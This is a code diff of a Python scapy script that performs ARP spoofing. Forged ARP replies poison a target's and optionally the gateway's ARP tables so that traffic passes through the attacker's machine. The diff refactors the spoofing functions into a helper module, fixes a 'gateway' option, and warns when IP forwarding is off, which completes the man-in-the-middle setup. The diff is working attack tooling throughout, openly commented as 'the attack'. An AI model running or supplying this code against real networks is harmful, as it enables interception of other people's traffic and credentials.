@@ -3,8 +3,9 @@
 import sys, getopt
 from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp
 from time import sleep
-from dhcpclient import DHCPClient
-BROADCASTMAC = "ff:ff:ff:ff:ff:ff"
+import arpUtil
+import subprocess
+
 rep = False 
 options = {
         "interface" :conf.iface,
@@ -15,17 +16,6 @@ options = {
         "router" : None , 
         "mac ":None 
     } 
-def getTargetMac(target : str)->str : 
-    etherAttack = Ether(dst =BROADCASTMAC)
-    arpAttack = ARP(pdst = target  , op = "who-has" )
-    reply = srp1(etherAttack/arpAttack , iface = options["interface"],verbose=False)
-    return reply[Ether].src
-
-def changeArpTable( target : str , src :str , srcMac : str )->None:
-    etherAttack = Ether(dst =getTargetMac(target) , src = srcMac)
-    arpAttack = ARP(pdst = target , psrc = src, op = "is-at" )
-    sendp(etherAttack/arpAttack , iface=options["interface"],verbose=False)
- 
 
 def main(argv :list )->None:
     '''
@@ -46,7 +36,7 @@ def main(argv :list )->None:
 
     try:
         opts, args = getopt.getopt(argv, "s:t:d:i:gw:h", [
-                                    "src=","delay=","target=","iface=","getway","help"])
+                                    "src=","delay=","target=","iface=","gateway","help"])
     except getopt.GetoptError as e:
         print(e)
         sys.exit(-1)
@@ -57,7 +47,6 @@ def main(argv :list )->None:
             sys.exit()
         elif opt in ("-i", "--iface"):
             options["interface"] = arg
-            #src = get_if_addr()
         elif opt in ("-s", "--src"):
             options["src"] = arg
         elif opt in ("-d", "--delay"):
@@ -67,18 +56,25 @@ def main(argv :list )->None:
         elif opt in ("-t", "--target"):
             options["target"] = arg
 
-    if not options["src"]:
-        options["src"]=  get_if_addr(options["interface"])
-    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
-    options["mac"]=get_if_hwaddr[options["interface"]]
-    targetMac= getTargetMac() 
-    #the attack 
-    changeArpTable(options["target"], options["router"] ,options["mac"] )
-    if(options["attackGW"]):
-        changeArpTable(options["router"] ,options["target"] , options["mac"] )
-    #repiar to the attack 
  
+    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
+    options["mac"]=get_if_hwaddr(options["interface"])
+    #the attack 
+    
+    
+    source = options["src"] if options["src"] else options["router"]
+    print(source)
+    arpUtil.changeArpTable(options["target"], source  ,options["mac"], options["interface"] )
+    if(options["attackGW"]):
+        arpUtil.changeArpTable(options["router"] ,options["target"] , options["mac"],options["interface"] )
+
 if __name__ == "__main__":
+    
+    batcmd="sysctl net.ipv4.ip_forward"
+    result = subprocess.check_output(batcmd, shell=True).decode(encoding='ascii')
+    print(result)
+    if "0" in result: 
+        sys.stderr.write("Warning : ip forwarding is not enabled")
     main(sys.argv[1:])
 
 
